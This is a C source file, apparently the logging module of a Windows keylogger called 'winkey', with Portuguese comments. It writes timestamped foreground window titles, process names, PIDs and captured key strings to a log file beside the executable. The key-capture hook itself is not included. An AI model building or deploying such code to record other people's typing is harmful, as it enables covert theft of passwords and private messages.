#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 // Define Windows 10/11
#endif
#pragma warning(push)
#pragma warning(disable: 4668) // Desativa avisos de macros do Windows SDK
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shellapi.h>
#pragma warning(pop)

#include <windows.h>
#include <stdio.h>
#include "logger.h"
#include "window.h"


static FILE *log_file = NULL;

void get_log_path(char *buffer, size_t buffer_size)
{
    // 1. Obtém o caminho completo do executável atual (ex: "C:\Pasta\winkey.exe")
    GetModuleFileNameA(NULL, buffer, (DWORD)buffer_size);

    // 2. Encontra a última barra do caminho
    char *last_slash = strrchr(buffer, '\\');
    if (last_slash != NULL)
    {
        // Trunca a string logo a seguir à barra
        *(last_slash + 1) = '\0';
    }

    // 3. Anexa o nome do ficheiro de log (ex: "C:\Pasta\winkey.log")
    strcat_s(buffer, buffer_size, "winkey.log");
}


static void logger_timestamp(void)
{
    SYSTEMTIME time;

    GetLocalTime(&time);

    fprintf(
        log_file,
        "[%02d.%02d.%04d %02d:%02d:%02d] ",
        time.wDay,
        time.wMonth,
        time.wYear,
        time.wHour,
        time.wMinute,
        time.wSecond
    );
}


BOOL logger_init(void)
{
    char log_path[MAX_PATH];
    errno_t error;

    // Obtém o caminho na mesma pasta do .exe
    get_log_path(log_path, sizeof(log_path));

    // Abre em modo "a" (append) usando o caminho gerado
    error = fopen_s(&log_file, log_path, "a");

    if (error != 0 || log_file == NULL)
    {
        return FALSE;
    }

    return TRUE;
}

void logger_close(void)
{
    if (log_file != NULL)
    {
        fclose(log_file);
        log_file = NULL;
    }
}


void logger_write_window(void)
{
    HWND hwnd;
    DWORD pid;
    char title[256];
    char process[260];


    if (log_file == NULL)
        return;


    hwnd = GetForegroundWindow();

    if (hwnd == NULL)
        return;


    GetWindowTextA(
        hwnd,
        title,
        sizeof(title)
    );


    GetWindowThreadProcessId(
        hwnd,
        &pid
    );


    window_get_foreground_process(
        process,
        sizeof(process)
    );


    fprintf(
        log_file,
        "\n"
    );


    logger_timestamp();


    fprintf(
        log_file,
        "- '%s'\nProcess: %s\nPID: %lu\n",
        title,
        process,
        pid
    );


    fflush(log_file);
}


void logger_write_key(
    const char *key
)
{
    if (log_file == NULL || key == NULL)
        return;


    fprintf(
        log_file,
        "%s",
        key
    );


    fflush(log_file);
}